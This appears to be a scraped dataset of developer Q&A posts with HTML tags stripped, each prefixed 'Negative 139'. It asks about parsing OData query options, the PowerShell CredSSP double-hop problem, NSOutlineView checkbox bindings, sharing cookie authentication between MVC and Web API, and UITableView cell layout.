support.p  pThank You. p

Negative 139 pI have been looking for solution to parse OData URL to replace the column names used.  p  pThe purpose is to accept OData query on server to particular entity type, forward the query to another ODataservice with similar structure but other column names and return the result as the previous type.br In other words provide a general interface for OData client but be able to fetch the data to other sources but retain the sorting and filtering asked for by the client.   p  pSimple solution would be to textreplace the desired column names but this could conflict with possible string values in the query. Using RegEx for this is highly complicated so proper parser is probably needed.  p  pThe best solution would be to parse through the emODataQueryOptions.Filterem and emOrderByem, replacing column names and return new OData querystring.  p  pSo the question is.. Does anyone know of library or code snippets that support parsing the ODataQueryOptions structure back to OData URI   p  pstrongNotestrong this solution must work with OData version 3 since I am restricted to that version in my project.p

Negative 139 pIm not finding any real alternatives to the doublehop issue in Windows besides CredSSP.p  pWhen I enabled it on the remote server and my local host, it completed the task initially but introduced a major issue I wasnt able to access the admin tool on that server.p  pMy localhost connects to Server A where I have an Admin Interface tool which uses a local account to log in.  When I established a connection to Server A using CredSSP, it seems to have enabled single sign on and preventing access to this admin interface tool.  Logging out of the PS session fixed the issue.p  pThe question here, and it goes towards a noncredSSP solution how can I perform a doublehop via powershell and continue having active local Server A sessions still connectedp  hr  pTo try and clarify a bit more specifically, the server I am connecting to is a GlobalScape EFT server.  I use the Admin Tool installed locally to remotely connect to the EFT Server using an EFT Server account.  When I setup CredSSP and established a proper connection to this Server, the EFT Server account no longer worked when trying to use the Admin Tool.  p  pThe reason Im looking for a doublehop in this case is to access other server shares that only the EFT Server has connections to.  Meanwhile, I still need the EFT Admin tool and account to still function properly, which is where the SSO issue from CredSSP kills me.p

Negative 139 pI have a view based NSOutlineView with, among other GUI elements, has a checkbox inside the Row view. I would like that checkbox to be hidden for all rows except the selected one. What I have tried so far is to bind the Hidden binding of the checkbox to Table Cell View with a key path of superview, and I created a value transformer in which I receive a NSTableRowView as a value object, so that I can check its isSelected property. This works fine when the Outline is first displayed, but if I change the selection, always the first items checkbox stays visible, while I would expect it to follow the selection dynamically.

Negative 139 pWe have an application in production built in mvc5 with cookie authentication. We added a component to this project that uses web api controller.

Is there a way to make web api use the same cookie authentication as the mvc controllersp
Negative 139 pI have a UITableView which cells contains a gridstyle of subviews placed in a XIB. Today they are arranged with autolayout and constraints.  These subviews may be of a dozen of types, some of these types have a fixed width, other have to fill the empty space, all have a fixed height. Each cell displays a particular set of these types based on its needs.p  pThe image below show 3 cells with their subviewsp  pa hrefhttpi.stack.imgur.comK0wm3.png relnofollowimg srchttpi.stack.imgur.comK0wm3.png altenter image description hereap  pThe point is that architecture requires a lot of rules to updates the constraints and is not easily maintainable when a new subview type is added. Using only a XIB per cell in that case doesnt seem to be the best choice as the initial interface builder  layout is just one of the multiple possible arrangement, and the cell has to do a lot of work to adapt. Also I would prefer a solution which doesnt require to touch the previous subviews types when a new one is added.p  pIve considered the following solutions p  ul lipInsert a collectionView inside the UITableViewcell, and transform the subviews to UICollectionViewCells  p  ul lido you think this may be a performance issue to have so much collectionViews on the screen  we may have up to 10 cells simultaneously on screen, each with 1 to 10 cellsli liConsidering the UICollectionViewCells would not even ever scroll inside the UITableViewCell isnt that a little overload to use a collectionView in that case, just for arranging a set of views li ulli lipUse the new UIStackViewp  ul lithe stackView is only compatible with iOS 9 so this means we have to maintain 2 versions of the code for a whileli lithe stackView seems to be a little complicated to place each subview pixel perfectli ulli lipMake an individual XIB for each subview type and make the corresponding UIView to compute its own constraints based on its neighbours, making thus a custom grid systemp  ul lithis is a little bit too a custom solution, therefore more difficult to maintain and understand for other developersli liit still requires to make a lot of changes if in the futur it will be a fourth column of subviews for example  its not a real grid system which would adapt nicelyli ulli ul  pWhich solution would you use  Do you have other suggestions  Thanksp
